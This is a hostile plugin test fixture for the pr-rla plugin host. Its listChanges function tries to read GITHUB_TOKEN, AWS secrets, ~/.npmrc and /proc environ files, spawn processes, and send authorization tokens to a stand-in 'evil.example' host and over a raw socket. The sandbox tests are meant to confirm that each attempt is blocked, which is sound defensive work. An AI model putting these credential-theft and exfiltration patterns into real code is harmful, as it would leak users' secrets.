// A HOSTILE provider, for pr-rla's own tests (test/plugin-host.test.ts). Its listChanges does what a
// malicious plugin would and reports what it got, in `limitations[0]` (JSON). Run through the plugin
// host, every attempt must come back as a placeholder, a refusal or ERR_ACCESS_DENIED; only the
// network on Node 22 and 24 is out of reach (a stated limit of the security model).
import { spawnSync } from "node:child_process";
import { readFileSync, writeFileSync } from "node:fs";
import net from "node:net";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { defineProvider } from "pr-rla/provider";

const attempt = async (fn) => {
  try {
    return { ok: true, value: await fn() };
  } catch (e) {
    return { ok: false, code: e.code ?? e.name, message: String(e.message).slice(0, 300) };
  }
};
const status = async (res) => `${res.status} ${await res.text()}`;

export default defineProvider({
  providerApiVersion: 1,
  name: "hostile",
  description: "steals what it can (test fixture)",
  hosts: () => ["api.github.com", "uploads.example.com"],
  credentials: [
    { env: "GITHUB_TOKEN", hosts: ["api.github.com"] },
    { env: "GITHUB_USER", hosts: ["api.github.com"] },
  ],
  create(options, ctx) {
    return {
      apiVersion: 1,
      name: "hostile",
      async listChanges() {
        if (options.hang) {
          console.error("hostile: about to hang");
          for (;;);
        }
        if (options.slowMs) await new Promise((r) => setTimeout(r, options.slowMs));
        if (options.bigResultBytes) return { changes: [], defaultBranch: "main", limitations: ["x".repeat(options.bigResultBytes)] };
        const token = `token ${ctx.env.GITHUB_TOKEN}`;
        const seen = {
          envToken: process.env.GITHUB_TOKEN,
          ctxEnvToken: ctx.env.GITHUB_TOKEN,
          envKeys: Object.keys(process.env).sort(),
          otherSecret: process.env.AWS_SECRET_ACCESS_KEY ?? null,
          npmrc: await attempt(() => readFileSync(join(homedir(), ".npmrc"), "utf8")),
          secretFile: await attempt(() => readFileSync(options.secretFile, "utf8")),
          procEnviron: await attempt(() => readFileSync(`/proc/${process.ppid}/environ`, "utf8")),
          writeOwnDir: await attempt(() => writeFileSync(new URL("./written.txt", import.meta.url), "x")),
          writeTmp: await attempt(() => writeFileSync(join(tmpdir(), `prrla-hostile-${process.pid}.txt`), "x")),
          spawn: await attempt(() => {
            const r = spawnSync("/bin/echo", ["hi"]);
            if (r.error) throw r.error;
            return r.status;
          }),
          // The declared host echoes the Authorization header it received.
          echo: await attempt(async () => status(await ctx.fetch("https://api.github.com/echo", { headers: { authorization: token } }))),
          basicEcho: await attempt(async () => status(await ctx.fetch("https://api.github.com/echo", { headers: { authorization: "prrla-basic:GITHUB_USER:GITHUB_TOKEN" } }))),
          placeholderToOtherDeclaredHost: await attempt(async () => status(await ctx.fetch("https://uploads.example.com/collect", { headers: { authorization: token } }))),
          placeholderToUndeclaredHost: await attempt(async () => status(await ctx.fetch("https://evil.example/collect", { headers: { authorization: token } }))),
          basicToUndeclaredHost: await attempt(async () => status(await ctx.fetch("https://evil.example/basic", { headers: { authorization: "prrla-basic:GITHUB_USER:GITHUB_TOKEN" } }))),
          basicToOtherDeclaredHost: await attempt(async () => status(await ctx.fetch("https://uploads.example.com/basic", { headers: { authorization: "prrla-basic:GITHUB_USER:GITHUB_TOKEN" } }))),
          globalFetch: await attempt(async () => status(await fetch("https://evil.example/global"))),
          post: await attempt(async () => status(await ctx.fetch("https://api.github.com/repos/acme/widgets/issues", { method: "POST", body: JSON.stringify({ title: "exfiltrated" }) }))),
          socket: options.socketPort
            ? await attempt(
                () =>
                  new Promise((resolve, reject) => {
                    const s = net.connect(options.socketPort, "127.0.0.1");
                    s.on("connect", () => s.end("exfiltrated", () => resolve("connected")));
                    s.on("error", reject);
                  }),
              )
            : null,
        };
        return { changes: [], defaultBranch: "main", limitations: [JSON.stringify(seen)] };
      },
    };
  },
});
